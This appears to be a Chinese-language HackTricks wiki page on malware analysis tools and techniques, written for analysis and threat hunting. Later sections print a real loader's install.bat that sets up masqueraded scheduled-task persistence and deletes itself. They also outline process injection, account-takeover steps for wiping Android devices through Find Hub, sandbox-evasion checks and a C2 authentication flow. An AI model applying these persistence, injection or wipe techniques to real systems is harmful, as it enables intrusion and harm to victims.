# 恶意软件分析

{{#include ../../banners/hacktricks-training.md}}

## 取证速查表

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## 在线服务

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## 离线防病毒与检测工具

### Yara

#### 安装
```bash
sudo apt-get install -y yara
```
#### 准备规则

使用此脚本从 github 下载并合并所有 yara malware 规则: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
创建 _**rules**_ 目录并执行它。 这将创建一个名为 _**malware_rules.yar**_ 的文件，其中包含所有用于 malware 的 yara 规则。
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### 扫描
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: 检查 malware 并创建 rules

你可以使用工具 [**YaraGen**](https://github.com/Neo23x0/yarGen) 从二进制文件生成 yara rules。查看这些教程： [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### 安装
```
sudo apt-get install -y clamav
```
#### 扫描
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** 检测可执行文件（PE、ELF、.NET）中潜在恶意的 **capabilities**。因此它会发现像 Att\&ck tactics 这样的内容，或以下可疑 capabilities：

- 检查 OutputDebugString 错误
- 作为服务运行
- 创建进程

在 [**Github repo**](https://github.com/mandiant/capa) 获取它。

### IOCs

IOC 表示 Indicator Of Compromise。IOC 是一组用于识别某些潜在不受欢迎软件或已确认 **malware** 的 **conditions that identify**。Blue Teams 使用这种定义在其 **systems** 和 **networks** 中 **search for this kind of malicious files**。\
共享这些定义非常有用：当在一台计算机上识别出 malware 并为该 malware 创建了 IOC 后，其他 Blue Teams 可以使用该 IOC 更快地识别出该 malware。

用于创建或修改 IOCs 的工具是 [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**。**\
你可以使用诸如 [**Redline**](https://www.fireeye.com/services/freeware/redline.html) 的工具来 **search for defined IOCs in a device**。

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) 是用于扫描 Simple Indicators of Compromise 的扫描器。\
检测基于四种检测方法：
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) 是一款面向 Linux 的 malware 扫描器，采用 GNU GPLv2 许可发布，针对共享托管环境所面临的威胁而设计。它使用来自网络边缘入侵检测系统的威胁数据来提取正在被用于攻击的 malware，并生成用于检测的签名。此外，威胁数据还来自用户通过 LMD checkout feature 提交的样本以及 malware 社区资源。

### rkhunter

像 [**rkhunter**](http://rkhunter.sourceforge.net) 这样的工具可用于检查文件系统，以发现可能的 **rootkits** 和 malware。
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) 是一个工具，会尝试使用多种技术在可执行文件中查找混淆的字符串。

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) 检查可执行文件中的一些基本信息（二进制数据、熵、URLs 和 IPs、一些 yara rules）。

### PEstudio

[PEstudio](https://www.winitor.com/download) 是一个工具，可获取 Windows 可执行文件的信息，例如 imports、exports、headers，同时也会检查 virus total 并发现潜在的 Att\&ck techniques。

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) 是一个用于检测文件是否被**加密**并且还能发现**加壳器**的工具。

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) 是一个 Python 脚本，使用多种**统计方法**来检测文本/脚本文件中**混淆的**和**加密的**内容。NeoPI 的目的在于辅助**检测隐藏的 web shell 代码**。

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) 尽最大努力检测**混淆的**/**可疑代码**，以及使用经常被用于 **PHP** 函数的文件，这些函数常见于 **malwares**/webshells。

### Apple Binary Signatures

在检查一些 **malware sample** 时，你应该始终 **检查二进制的签名**，因为签署该二进制的 **developer** 可能已经与 **malware** 有关联。
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## 检测技术

### File Stacking

如果你知道某个包含 **文件** 的 web server 文件夹在 **某个日期被最后更新**，请**检查**所有 **文件** 的**创建和修改日期**，如果有任何日期**可疑**，就检查该文件。

### Baselines

如果一个文件夹的 **文件** 本不应该被修改，你可以计算该文件夹 **原始文件** 的 **hash**，并将其与 **当前** 的进行 **比较**。任何被修改的都会被视为 **可疑**。

### Statistical Analysis

当信息保存在 logs 中时，你可以**检查统计信息，比如每个 web server 的文件被访问的次数，因为 web shell 可能是被访问次数最多的之一**。

---

### Android in-app native telemetry (no root)

在 Android 上，你可以通过在其他 JNI 库初始化之前预加载一个小的 logger 库来对目标应用进程内的 native 代码进行插装。这能在不依赖系统范围 hooks 或 root 的情况下，尽早看到 native 行为。一个常用的方法是 SoTap：将 libsotap.so 放入对应的 ABI 的 APK 中，并在早期（例如静态初始化器或 Application.onCreate）注入 System.loadLibrary("sotap") 调用，然后从内部/外部路径或 Logcat 回退收集日志。

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

一些 Android 恶意软件和 RASP 保护的应用在调用 RegisterNatives 之前通过在运行时解码来隐藏 JNI 方法名和签名。当反调试手段导致 Frida/ptrace 插装被终止时，仍可以通过用 angr 在离线环境中执行程序内的解码器来恢复明文，然后将结果作为注释推回到 Ghidra。

关键思路：把 .so 内的解码器当作一个可调用函数，在 .rodata 中对被混淆的字节 blobs 执行它，并具体化输出字节直到第一个 \x00（C-string terminator）。保持 angr 和 Ghidra 使用相同的 image base 以避免地址不匹配。

Workflow overview
- 在 Ghidra 中进行初筛：识别解码器以及其在 JNI_OnLoad 和 RegisterNatives 设置中的调用约定/参数。
- 使用 angr (CPython3) 为每个目标字符串执行解码器并导出结果。
- 在 Ghidra 中注释：在每个调用点为解码出的字符串自动添加注释，以便快速重构 JNI。

Ghidra triage (JNI_OnLoad pattern)
- 将 JNI 数据类型应用到 JNI_OnLoad，以便 Ghidra 识别 JNINativeMethod 结构。
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- 查找对 RegisterNatives 的调用。如果库通过一个本地例程（例如 FUN_00100e10）构造 name/signature，而该例程引用静态字节表（例如 DAT_00100bf4）并接受类似 (encoded_ptr, out_buf, length) 的参数，那么这就是离线执行的理想目标。

angr setup (execute the decoder offline)
- 用在 Ghidra 中相同的 base 加载 .so（例如：0x00100000），并禁用外部库的自动加载以保持状态小。

<details>
<summary>angr 设置与离线解码器执行</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- 在大规模情况下，构建一个调用站点到解码器的参数映射 (encoded_ptr, size)。包装器可能会隐藏参数，因此如果 API 恢复结果嘈杂，你可以从 Ghidra xrefs 手动创建该映射。

<details>
<summary>使用 angr 批量解码多个调用站点</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

在 Ghidra 中注释调用点
Option A: Jython-only comment writer (use a pre-computed JSON)
- 由于 angr 需要 CPython3，请将去混淆和注释分开。首先运行上面的 angr 脚本以生成 decoded_strings.json。然后运行这个 Jython GhidraScript，在每个调用点写入 PRE_COMMENTs（并包含调用者函数名以提供上下文）：

<details>
<summary>用于注释解码后的 JNI 字符串的 Ghidra Jython 脚本</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: 单个 CPython 脚本（通过 pyhidra/ghidra_bridge）
- 或者，使用 pyhidra 或 ghidra_bridge 从运行 angr 的同一 CPython 进程驱动 Ghidra 的 API。这样可以调用 decode_string() 并立即设置 PRE_COMMENTs，而无需中间文件。其逻辑与 Jython 脚本相同：通过 ReferenceManager 构建 callsite→function 映射，用 angr 解码，然后设置注释。

为什么可行以及何时使用
- 离线执行可以绕过 RASP/anti-debug：无需 ptrace，也无需 Frida 钩子即可恢复字符串。
- 使 Ghidra 和 angr 的 base_addr 对齐（例如 0x00100000）可以确保函数/数据地址在工具间匹配。
- 可重复的解码器流程：将变换视为纯函数，在一个新状态中分配输出缓冲区，用 (encoded_ptr, out_ptr, len) 调用它，然后通过 state.solver.eval 求解并解析到 \x00 为止的 C 字符串。

注意事项与陷阱
- 尊重目标 ABI/调用约定。angr.factory.callable 会根据 arch 选择；如果参数看起来偏移，请明确指定 cc。
- 如果解码器期望输出缓冲区为零，在调用前在状态中将 outbuf 初始化为零。
- 对于位置无关的 Android .so，总是提供 base_addr，以便 angr 中的地址与 Ghidra 中看到的匹配。
- 使用 currentProgram.getReferenceManager() 枚举 call-xrefs，即使应用通过轻量 stub 封装了解码器。

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## 反混淆动态控制流 (JMP/CALL RAX Dispatchers)

现代恶意软件家族广泛滥用 Control-Flow Graph (CFG) 混淆：它们不是直接跳转/调用，而是在运行时计算目标并执行 `jmp rax` 或 `call rax`。一个小的 *dispatcher*（通常九条指令）根据 CPU 的 `ZF`/`CF` 标志设置最终目标，彻底破坏静态 CFG 恢复。

该技术 — 由 SLOW#TEMPEST loader 展示 — 可以通过一个仅依赖 IDAPython 和 Unicorn CPU 模拟器的三步工作流来破解。

### 1. 定位每个间接跳转/调用
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. 提取 dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. 使用 Unicorn 模拟两次
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
运行 `run(code,0,0)` 和 `run(code,1,1)` 以获取 *false* 和 *true* 分支目标。

### 4. 修补回直接 jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
打补丁后，强制 IDA 重新分析该函数，以便恢复完整的 CFG 和 Hex-Rays 输出：
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. 标注间接 API 调用

一旦确定了每个 `call rax` 的真实目标，你就可以告诉 IDA 它是什么，这样参数类型 & 变量名就会自动恢复：
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### 实际好处

* 恢复真实的 CFG → 反编译从 *10* 行扩展到数千行。
* 启用 string-cross-reference & xrefs，使行为重建变得非常简单。
* 脚本可重用：将它们放入任何受相同技巧保护的 loader 中。

---

## 基于 AutoIt 的 loaders：.a3x 解密、Task Scheduler 伪装和 RAT 注入

该入侵模式链入了签名的 MSI、编译为 .a3x 的 AutoIt loaders，以及伪装成良性应用的 Task Scheduler 任务。

### MSI → custom actions → AutoIt orchestrator

由 MSI custom actions 执行的进程树和命令：

- MsiExec.exe → cmd.exe 用于运行 install.bat
- WScript.exe 用于显示诱饵错误对话框
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (投放 loader, 设置 persistence, 自清理):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (用户诱饵):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- 将 AutoIt3.exe 和 IoKlTr.au3 投放到 C:\Users\Public\Music
- 将 schtasks.exe 复制为 hwpviewer.exe（伪装为 Hangul Word Processor viewer）
- 创建计划任务 "IoKlTr"，每 1 分钟运行一次
- 启动项快捷方式为 Smart_Web.lnk；mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- 在 %APPDATA%\Google\Browser\ 的子文件夹（名称包含 `adb` 或 `adv`）下部署模块，并通过 autoit.vbs/install.bat 辅助脚本启动它们

Forensic triage tips:
- schtasks 枚举：`schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- 查找与 Task XML 同目录的被重命名的 schtasks.exe 副本：`dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- 常见路径：`C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, 启动项 `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- 关联进程创建：AutoIt3.exe 衍生合法 Windows 二进制（例如 cleanmgr.exe、hncfinder.exe）

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt 模块使用 `#AutoIt3Wrapper_Outfile_type=a3x` 编译，并在注入到良性进程之前解密嵌入的 payloads。
- 观测到的家族：QuasarRAT（注入到 hncfinder.exe）和 RftRAT/RFTServer（注入到 cleanmgr.exe），以及 RemcosRAT 模块（`Remcos\RunBinary.a3x`）。
- 解密模式：通过 HMAC 推导 AES 密钥，解密嵌入的 blob，然后注入明文模块。

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- 在目标宿主上执行 CreateProcess（suspended），例如 cleanmgr.exe
- 使用 VirtualAllocEx + WriteProcessMemory 写入解密后的 module/shellcode
- 通过 CreateRemoteThread 或 QueueUserAPC 执行 payload

Hunting ideas
- 父进程为 MsiExec.exe 或 WScript.exe 的 AutoIt3.exe 生成系统工具
- 在公共/用户可写路径下带有 `.a3x` 扩展名的文件或 AutoIt 脚本运行器
- 可疑计划任务执行 AutoIt3.exe 或未被 Microsoft 签名的二进制文件，触发频率为分钟级

### Account-takeover abuse of Android Find My Device (Find Hub)

在 Windows 入侵期间，操作者使用被盗的 Google 凭据反复抹除受害者的 Android 设备，在通过受害者已登录的桌面 messenger 扩大访问权限时抑制通知。

Operator steps (from a logged-in browser session):
- 查看 Google Account → Security → Your devices；进入 Find My Phone → Find Hub (https://www.google.com/android/find)
- 选择设备 → 重新输入 Google 密码 → 发起 "Erase device"（factory reset）；重复以延迟恢复
- 可选：清除关联邮箱（例如 Naver）中的报警邮件以隐藏安全通知

## Tracing heavily obfuscated Node.js loaders

攻击者越来越多地将 JavaScript 加载器捆绑到使用 [`nexe`](https://github.com/nexe/nexe) 编译的独立 Windows 二进制中，因此运行时与脚本一起分发。生成的 PE 通常为 60–90 MB，即使未安装 Node.js 也能执行。分析期间：

- 使用 [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) 将嵌入的 JavaScript 从 PE 中提取出来，并交给本地工具进行静态差异分析。
- 预计在 `%TEMP%` 中会有基于磁盘的互斥体（GachiLoader 会丢弃一个随机的 `<name>.lock` 文件，大约 5 分钟后过期）。在执行前将该文件复制到沙箱可以让你跳过冗余阶段，同时仍能看到后续 payloads。

### Node.js API tracing to defeat anti-analysis

Check Point 的 [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) 钩取任何 Node.js 进程内的核心模块，允许你伪造反-VM 探测，并保留样本写入的每个工件。通过 tracer 启动混淆脚本，以将分析人员控制的插装保留在调用栈中：
```powershell
node -r .\tracer.js main.js
```
在 `tracer.js` 中的关键配置开关允许你：

- 记录文件系统、子进程和 HTTP 活动 (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`)。每个被丢弃的文件——例如 `kidkadi.node`——在恶意软件删除前会被复制到工作目录。
- 通过返回真实感的 RAM/CPU 数量、伪造 `tasklist` 输出以及篡改 PowerShell/WMI 响应来覆盖环境指纹。这可以绕过要求 ≥4 GB RAM、≥2 cores 的 loaders，并规避对用户名（`mashinesssss`、`wdagutilityaccount` 等）、主机名（`desktop-vrsqlag`、`server1` …）和进程名（`vmtoolsd.exe`、`fiddler.exe`、`x64dbg.exe`、`frida-server.exe`）的审查。
- 禁用诸如 `Get-WmiObject Win32_DiskDrive`（寻找 `vmware`、`kvm`、`virtio` 等）、`Win32_VideoController`（阻止 “VirtualBox Graphics Adapter”、“Hyper-V Video”等）以及 `Win32_PortConnector` 计数的 WMI 硬件检查。当这些探针报告“真实”硬件时，sandboxes 不再触发 GachiLoader 用来浪费分析时间的对 `linkedin.com`、`grok.com`、`whatsapp.com` 等类似域名发起的良性 `Invoke-WebRequest` 调用的无限循环。

### 自动捕获受限 C2 流量

tracer 的网络 hooks 能在不逆向 JavaScript 混淆的情况下揭示多层 C2 认证。在观察到的活动中，loader 会：

1. 向每个硬编码的 C2 的 `/log` 以 POST 方式发送主机遥测。
2. 使用 `X-Secret: gachifamily` 对 `GET /richfamily/<per-sample key>` 发起请求以检索一个 Base64 编码的 payload URL。
3. 对该 URL 发起最终的 `GET`，并带上长的 per-sample `X-Secret` 头；缺失该头会返回 `403 Forbidden`。

因为 tracer 会记录完整请求（headers、bodies、destinations），你可以重放相同的流量来拉取 payloads，在内存中 dump Themida/VMProtect 壳，并大规模提取 Rhadamanthys 的配置数据。

## AdaptixC2：配置提取和 TTPs

参见专页：

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
